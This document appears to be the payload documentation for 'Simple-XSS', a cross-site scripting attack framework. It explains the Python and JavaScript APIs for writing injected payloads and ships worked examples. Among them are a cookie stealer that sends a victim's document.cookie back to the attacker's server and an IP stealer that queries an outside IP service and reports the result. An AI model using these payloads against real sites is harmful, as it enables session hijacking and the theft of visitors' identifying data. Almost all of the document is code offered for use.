# Simple-XSS Payloads

See [payload.](VOCABULARY.md)

## API

### Payload-API

#### Environment

Environment - actual information about running process:

- url - current transport server address (tunneled or not)
- settings - current Simple-XSS settings
- arguments - current Simple-XSS arguments

```python
class Environment:
    url: str = None
    settings: SettingsSchema = None
    arguments: ArgumentsSchema = None
```

#### Dependencies

Payloads have dependencies:

- [transport API](#Transport-API)
- [io API](#IO-API)
- [environment](#Environment)

Dependencies are accessible in payload after binding:

```python
from simplexss.api import BasePayload


class Payload(BasePayload):
    def bind_dependencies(self, **deps):
        self.transport = deps.get('transport')
        self.io = deps.get('io')
        self.environment = deps.get('env')
```

Payload methods that called at a specific time:

- ```def bind_dependencies(self, **deps)``` - called when process is launching to bind dependencies.

- ```def bind_endpoints(self)``` - called when process is launching to bind event handlers (endpoints) to transport.

### Transport-API

See [transport.](VOCABULARY.md)

Transport API is provided for the payload to communicate with client. Every transport should have single Python-side API:

```python
class BaseClient: # depends on Transport Service, but always should inherit Base
    origin: str


class BaseEvent: # depends on Transport Service, but always should inherit Base
    name: str
    data: dict = None


type Endpoint = Callable[[BaseClient, BaseEvent], Coroutine | BaseEvent | any | None] # event handler type


class BaseTransportAPI(ABC):
    @abstractmethod
    def bind_endpoint(self, event: str, endpoint: Endpoint): ... # add event handler

    @abstractmethod
    async def send_event(self, client: BaseClient, event: BaseEvent): ... # send event
```

### Transport-JS-API

Every transport should have single JS-side API:

```js 
const addListener = (event: string, callback) => ... // add event handler

const sendEvent = async (event: string, data: object = {}) => ... // send event
```

Example callback:
```js
const callback = (data: object) => ... // User event handler 
```
### IO-API

An I/O manager is provided for the payload to handle IO operations. It has interface:

```python
class BaseIOManagerAPI(ABC):
    @abstractmethod
    async def print(self, *args, color: Color | str = Color.DEFAULT, sep: str = ' ', end: str = '\n'): ...

    @abstractmethod
    async def input(self, prompt: str, /, *, color: Color | str = Color.DEFAULT): ...
```

## Examples

### IP Stealer

```python
# payload.py

from simplexss.api import (
    BasePayload,
    BaseClient,
    BaseEvent,
    render
)


class Payload(BasePayload):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Steals IP.'
    NAME = 'IP Stealer'
    VERSION = '0.0.1'

    async def on_ip(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'IP: {event.data.get("ip", "unknown")}')

    async def on_connection(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Connection established: {client.origin}')

    def bind_endpoints(self):
        self.transport.bind_endpoint('connection', self.on_connection)
        self.transport.bind_endpoint('ip', self.on_ip)

    @property
    def payload(self) -> str:
        return render(self.directory, 'payload.js', )
```

```js
// payload.js

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => sendEvent('ip', {'ip': data.ip}));
```

### Cookie Stealer

```python
# payload.py

from simplexss.api import (
    BasePayload,
    BaseClient,
    BaseEvent,
    render
)


class Payload(BasePayload):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Steals cookies.'
    NAME = 'Cookie Stealer'
    VERSION = '0.0.1'

    async def on_cookies(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Cookies: {event.data.get("cookies")}')

    async def on_connection(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Connection established: {client.origin}')

    def bind_endpoints(self):
        self.transport.bind_endpoint('connection', self.on_connection)
        self.transport.bind_endpoint('cookies', self.on_cookies)

    @property
    def payload(self) -> str:
        return render(self.directory, 'payload.js', )
```

```js
// payload.js

sendEvent('cookies', {'cookies': document.cookie})
```

### Alert

```python
# payload.py

from simplexss.api import (
    BasePayload,
    BaseClient,
    BaseEvent,
    render
)


class Payload(BasePayload):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Alerts your message when connection established.'
    NAME = 'Alert'
    VERSION = '0.0.1'

    async def on_connection(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Connection established: {client.origin}')

        text = await self.io.input('Text')

        return {
            'name': 'alert',
            'data': {
                'text': text
            }
        }

    def bind_endpoints(self):
        self.transport.bind_endpoint('connection', self.on_connection)

    @property
    def payload(self) -> str:
        return render(self.directory, 'payload.js', )
```

```js
// payload.js

addListener('alert', (data) => alert(data.text))
```